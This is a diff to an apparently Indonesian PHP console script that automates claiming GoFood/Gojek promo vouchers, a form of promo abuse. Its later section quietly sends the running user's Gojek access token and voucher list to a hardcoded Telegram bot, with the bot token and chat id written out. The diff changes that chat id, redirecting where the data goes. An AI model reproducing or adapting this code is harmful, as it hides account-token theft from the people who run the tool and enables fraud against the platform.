@@ -4,8 +4,8 @@ include "function.php";
 echo "\e[96m_________________\e[95m".date('[d-m-Y] [H:i:s]')."\e[96m________________\n";
 echo "\e[95m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
 echo "\e[96m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
-echo "\e[93m   	   \e[96m	 JANGAN DIJUAL!!!	 \e[93m \n";
-echo "\e[93m           	 \e[96m   FOODJABO   \e[93m \n";
+echo "\e[93m      \e[96m	JAGAN DIJUAL!!!		  \e[93m \n";
+echo "\e[93m  	 \e[96m   	FOODJABO	 \e[93m \n";
 echo "\e[96m  ==============================================\n";
 echo "\e[96m  =\e[95m 🤸  1. VOUCHER GOFOOD EATLAH ✓          🇮🇩 \e[96m=\n";
 echo "\e[96m  =\e[95m 🤸  2. VOUCHER GOFOOD 15K MINBEL 30K  ✓ 🇮🇩 \e[96m=\n";
@@ -69,7 +69,7 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
                 $hp = '62'.substr(trim($nohp),1);
         }
          elseif(substr(trim($nohp), 0, 2)=='62'){
-            $hp = '6'.substr(trim($nohp), 1); 
+            $hp = '6'.substr(trim($nohp), 1);
         }
         else{
             $hp = '1'.substr(trim($nohp),0,13);
@@ -103,7 +103,7 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
         echo "\n".color("green","🔓▶️ Message: ".$message);
         goto gocar;
-        }else{s
+        }else{
         echo "\n".color("red","🔐▶️ Message: ".$message);
 	      gocar:
         echo "\n".color("nevy","🔒▶️ Claim voc GOFOOD A");
@@ -184,7 +184,7 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
         $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
         $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
-      	$chatid = "785784404";
+      	$chatid = "78573333";
       	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
       	$method	= "sendMessage";
       	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
